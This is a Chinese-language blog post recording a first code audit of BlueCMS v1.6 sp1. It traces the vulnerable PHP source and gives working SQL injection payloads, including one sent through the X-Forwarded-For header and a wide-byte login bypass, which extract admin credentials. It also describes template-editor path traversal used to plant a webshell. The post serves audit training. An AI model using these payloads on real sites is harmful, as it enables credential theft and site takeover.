<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 代码审计初体验-bluecms_v1.6_sp1 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="代码审计初体验-bluecms_v1.6_sp1 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">代码审计初体验-bluecms_v1.6_sp1</h1><div class="post-time">Aug 27, 2018</div><div class="post-content"><!-- ttoc -->
<h3><span id="前言">前言</span></h3><p>一些想做一些代码审计的内容，之前只有做过简单的PHP代码段的审计，没有尝试过整站的代码审计的工作。所以一切重新开始，从最简单的开始。找一些比较老和简单的CMS进行代码审计的训练，熟悉流程，熟悉用PHP调试的方法跟进。</p>
<h3><span id="bluecms_v16_sp1">Bluecms_v1.6_sp1</span></h3><h4><span id="sql注入一">SQL注入一</span></h4><p>在<code>/uploads/uc_client</code>路径下中可以看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">if(empty($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;Error!&apos;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br></pre></td></tr></table></figure>
<p>这里可以看到<code>ad_id</code>传入一个ID值，判断该值是否为空。在代入自定义的函数<code>getone()</code></p>
<p>查找函数<code>getone()</code>到路径<code>\uploads\include\mysql.class.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">	$query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">	$row = mysql_fetch_array($query, $type);</span><br><span class="line">	return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里封装成了简单的SQL查询函数，函数的第二个参数指定数组类型，<code>MYSQL_ASSOC</code>是关联数组。</p>
<p><code>PhpStorm</code>调试跟进，跟进到了<code>\uploads\include\common.fun.php</code> 这个一个公共函数的文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function table($table)</span><br><span class="line">&#123;</span><br><span class="line">	global $pre;</span><br><span class="line">	return  $pre .$table ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$pre</code>的一个全局变量，在<code>uploads\data\config.php</code>定义的值为<code>blue_</code>即安装文件时的表面前缀。</p>
<p>所以<code>$table</code>函数返回的是一个表名<code>blue_ad</code>。</p>
<p>进一步跟进就到了<code>getone()</code>函数进行SQL语句的查询，再进入一个<code>time_set</code>判断过程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if($ad[&apos;time_set&apos;] == 0)</span><br><span class="line">&#123;</span><br><span class="line">	$ad_content = $ad[&apos;content&apos;];</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	if($ad[&apos;end_time&apos;] &lt; time())</span><br><span class="line">	&#123;</span><br><span class="line">		$ad_content = $ad[&apos;exp_content&apos;];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$ad_content = $ad[&apos;content&apos;];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再做个替换进行输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ad_content = str_replace(&apos;&quot;&apos;, &apos;\&quot;&apos;,$ad_content);</span><br><span class="line">$ad_content = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$ad_content);</span><br><span class="line">$ad_content = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$ad_content);</span><br><span class="line">echo &quot;&lt;!--\r\ndocument.write(\&quot;&quot;.$ad_content.&quot;\&quot;);\r\n--&gt;\r\n&quot;;</span><br></pre></td></tr></table></figure>
<p>传入<code>Payload</code>利用<code>PHPstorm</code>调试进行跟进测试。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms1.jpg" alt=""></p>
<p><code>$ad_id</code>直接代入<code>$sql</code>进行SQL查询。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms2.jpg" alt=""></p>
<p>继续跟进返回查询结果，注入成功返回admin用户的<code>username:password</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms3.jpg" alt=""></p>
<h4><span id="sql注入二">SQL注入二</span></h4><p>在<code>\uploads\include\common.fun.php</code>文件中有<code>getip()</code>函数，该函数是用来获取用户IP。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">	if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_CLIENT_IP&apos;); </span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) </span><br><span class="line">	&#123; //获取客户端用代理服务器访问时的真实ip 地址</span><br><span class="line">		$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); </span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123; </span><br><span class="line">		$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">	&#125;</span><br><span class="line">	return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getenv</code>函数用来获取一个环境变量的值。获取到的<code>$ip</code>值没有进行任务校验。</p>
<p>全局搜索<code>getip()</code>函数，<code>\uploads\comment.php</code>文件有用到这个函数。而且还涉及到了SQL语言操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">		VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure>
<p>SQL注入就是要在已有的SQL查询语句上进行拼接，可以利用拼接的点就是<code>&quot;.getip().&quot;</code>这个点，首先要知道的是在SQL语句中的<code>INSERT INTO</code>来插入内容是可以一次插入多条数据的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; insert into user (id,username,password) value (&apos;1&apos;,&apos;a&apos;,&apos;a&apos;),(&apos;2&apos;,&apos;b&apos;,&apos;b&apos;);</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| Id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | a        | a        |</span><br><span class="line">|  2 | b        | b        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以先闭合前一条插入，然后利用第二条插入的数据进行SQL注入。Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;,&apos;1&apos;),(&apos;&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;6&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin),&apos;1&apos;,&apos;1</span><br></pre></td></tr></table></figure>
<p>可以利用<code>phpstorm</code>调试看下代入的结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)</span><br><span class="line">  VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;1&apos;,&apos;1&apos;),(&apos;&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;6&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin),&apos;1&apos;,&apos;1&apos;, &apos;$is_check&apos;)&quot;;</span><br></pre></td></tr></table></figure>
<p>从代入结果来看，用<code>1&#39;,&#39;1&#39;),</code>来闭合第一条添加的数据，并在后面拼接插入第二条数据。<code>post_id, user_id</code>对于的是评论的<code>ID值</code>和用户的<code>ID值</code>。同时我们利用<code>content</code>来保存我们注入得到的数据内容，并显示出来。</p>
<p>发送请求包，对<code>X-Forwarded-For</code>插入<code>Payload</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms4.jpg" alt=""></p>
<p>并得到返回结果</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms5.jpg" alt=""></p>
<p><code>getip()</code>函数也在<code>\uploads\guest_book.php</code>中利用到。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">		VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure>
<p>这里是用<code>$online_ip</code>来得到<code>getip()</code>函数的返回值。</p>
<p>同样的方法我们可以对这个点进行SQL注入。这里直接拼接前面的就行。<code>Payload</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin))#</span><br></pre></td></tr></table></figure>
<p>拼接后的SQL查询语句如下，<code>#</code>注释后面多余的字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">		VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;1&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin))#&apos;, &apos;$content&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure>
<p><code>burpsuite</code>发送请求包</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms6.jpg" alt=""></p>
<p>成功注入得到数据内容。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms7.jpg" alt=""></p>
<h4><span id="sql注入三宽字节注入">SQL注入三（宽字节注入）</span></h4><p>在配置文件<code>\uploads\data\config.php</code>中设置了cms的默认字符集为<code>gb2312</code>为宽字节字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;BLUE_CHARSET&apos;,&apos;gb2312&apos;);</span><br></pre></td></tr></table></figure>
<p>同时在<code>\uploads\include\common.inc.php</code>对各种参数进行了转义处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">   $_POST = deep_addslashes($_POST);</span><br><span class="line">   $_GET = deep_addslashes($_GET);</span><br><span class="line">   $_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">   $_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>\include\mysql.class.php</code>中也有<code>MySQL</code>的默认字节为<code>GBK</code>为宽字节。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function mysql($dbhost, $dbuser, $dbpw, $dbname = &apos;&apos;, $dbcharset = &apos;gbk&apos;, $connect=1)&#123;</span><br><span class="line">	$func = empty($connect) ? &apos;mysql_pconnect&apos; : &apos;mysql_connect&apos;;</span><br><span class="line">	if(!$this-&gt;linkid = @$func($dbhost, $dbuser, $dbpw, true))&#123;</span><br><span class="line">		$this-&gt;dbshow(&apos;Can not connect to Mysql!&apos;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		if($this-&gt;dbversion() &gt; &apos;4.1&apos;)&#123;</span><br><span class="line">			mysql_query( &quot;SET NAMES gbk&quot;);</span><br><span class="line">			if($this-&gt;dbversion() &gt; &apos;5.0.1&apos;)&#123;</span><br><span class="line">				mysql_query(&quot;SET sql_mode = &apos;&apos;&quot;,$this-&gt;linkid);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if($dbname)&#123;</span><br><span class="line">		if(mysql_select_db($dbname, $this-&gt;linkid)===false)&#123;</span><br><span class="line">			$this-&gt;dbshow(&quot;Can&apos;t select MySQL database($dbname)!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据宽字节注入的原理：CMS中编码为<code>GB2312</code>，函数执行添加的是<code>ASCII编码</code>，MYSQL默认字符集是<code>GBK</code>。</p>
<p><code>%DF&#39;</code>会被PHP当中的addslashes函数转义为<code>%DF\&#39;</code> ，“\”既URL里的<code>%5C</code>，那么也就是说，<code>%DF&#39;</code>会被转成<code>%DF%5C%27</code>网站的字符集是<code>gb2312</code>，MYSQL使用的编码是<code>GBK</code>，就会认为<code>%DF%5C%27</code>是一个宽字符。也就是<code>縗&#39;</code>。这样就可以得到单引号进行注入了。</p>
<p>分析代码，在<code>\uploads\admin\login.php</code>文件中。登录处有如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> 		update_admin_info($admin_name);</span><br><span class="line"> 		if($remember == 1)&#123;</span><br><span class="line"> 			setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400);</span><br><span class="line"> 			setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400);</span><br><span class="line">			setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400);</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;else&#123;</span><br><span class="line"> 		showmsg(&apos;您输入的用户名和密码有误&apos;);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	showmsg(&apos;欢迎您 &apos;.$admin_name.&apos; 回来，现在将转向管理中心...&apos;, &apos;index.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>跟进函数<code>check_admin()</code>，到文件<code>\uploads\admin\include\common.fun.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">	global $db;</span><br><span class="line">	$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> 	if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		return true;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	else</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		return false;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是可以利用万能密码进行绕过的，但是会对单引号进行转义。这个时候就能利用宽字节注入进行单引号的逃逸了。构造如下<code>Payload</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin%df&apos; or 1=1#&amp;admin_pwd=1</span><br></pre></td></tr></table></figure>
<p>代入SQL语句拼接结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;admin%df&apos; or 1=1#&apos; and pwd = md5(&apos;1&apos;)&quot;);</span><br></pre></td></tr></table></figure>
<p>语句返回为<code>true</code>。绕过登录认证成功登录<code>admin</code>账号。</p>
<p>利用<code>PHPstorm</code>断点调试跟进。</p>
<p>进行正常的登录，<code>PHPstorm</code>进行调试。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms8.jpg" alt=""></p>
<p>进入跟进到mysql类文件里</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms9.jpg" alt=""></p>
<p>绕过判断<code>check_admin</code>函数。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms10.jpg" alt=""></p>
<p>成功登录。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms11.jpg" alt=""></p>
<h4><span id="本地文件包含">本地文件包含</span></h4><p>在目录<code>\uploads\admin\tpl_manage.php</code>文件中有可以进行模板文件编辑的功能。</p>
<p>打开目标模板文件代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;edit&apos;)&#123;</span><br><span class="line">	$file = $_GET[&apos;tpl_name&apos;];</span><br><span class="line">	if(!$handle = @fopen(BLUE_ROOT.&apos;templates/default/&apos;.$file, &apos;rb&apos;))&#123;</span><br><span class="line">		showmsg(&apos;打开目标模板文件失败&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	$tpl[&apos;content&apos;] = fread($handle, filesize(BLUE_ROOT.&apos;templates/default/&apos;.$file));</span><br><span class="line">	$tpl[&apos;content&apos;] = htmlentities($tpl[&apos;content&apos;], ENT_QUOTES, GB2312);</span><br><span class="line">	fclose($handle);</span><br><span class="line">	$tpl[&apos;name&apos;] = $file;</span><br><span class="line">	template_assign(array(&apos;current_act&apos;, &apos;tpl&apos;), array(&apos;编辑模板&apos;, $tpl));</span><br><span class="line">	$smarty-&gt;display(&apos;tpl_info.htm&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><code>$file = $_GET[&#39;tpl_name&#39;];</code>以<code>GET</code>方式获取文件名，这里没有对文件名进行任何处理，直接代入<code>fopen</code>函数拼接打开文件。这里可以利用<code>../../../uploads/ad_js.php</code>包含到本地的文件。</p>
<p>同时在这段读取的代码下面是有一段可以编辑的代码的。编辑的代码也没有做处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_edit&apos;)&#123;</span><br><span class="line"> 	$tpl_name = !empty($_POST[&apos;tpl_name&apos;]) ? trim($_POST[&apos;tpl_name&apos;]) : &apos;&apos;;</span><br><span class="line"> 	$tpl_content = !empty($_POST[&apos;tpl_content&apos;]) ? deep_stripslashes($_POST[&apos;tpl_content&apos;]) : &apos;&apos;;</span><br><span class="line"> 	if(empty($tpl_name))&#123;</span><br><span class="line"> 		return false;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	$tpl = BLUE_ROOT.&apos;templates/default/&apos;.$tpl_name;</span><br><span class="line"> 	if(!$handle = @fopen($tpl, &apos;wb&apos;))&#123;</span><br><span class="line">		showmsg(&quot;打开目标模版文件 $tpl 失败&quot;);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	if(fwrite($handle, $tpl_content) === false)&#123;</span><br><span class="line"> 		showmsg(&apos;写入目标 $tpl 失败&apos;);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	fclose($handle);</span><br><span class="line"> 	showmsg(&apos;编辑模板成功&apos;, &apos;tpl_manage.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>代码中的<code>$_POST[&#39;tpl_content&#39;]</code>没有做处理，可以直接修改。</p>
<p>这样我们可以利用这个直接在<code>/uploads/ad_js.php</code>插入一句话木马。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms12.jpg" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms13.jpg" alt=""></p>
<h3><span id="结语">结语</span></h3><p>这是第一次看一整套CMS的源码，之前接触到的都是CTF中常见的代码片段。整套的CMS的审计难度还是挺大的，特别是像那种MVC框架的，这套代码的结构还是相对于简单，漏洞也没有太多的过滤函数需要去进行<code>ByPass</code>的。实习的暑假阶段也快结束了，这个暑假在实习公司这边学了不少关于应急响应和漏洞挖掘方面的东西，可能是因为比自己平时自学更具有实战性，可能性和未知性吧。接下来争取每周至少整理一篇代码审计方面的博客吧，一步一步的来，慢慢往上爬。</p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/代码审计/代码审计2-ZZCMS8-1.html" class="prev">上一篇</a><a href="/posts/notes/SQLMap-tamper编写尝试.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>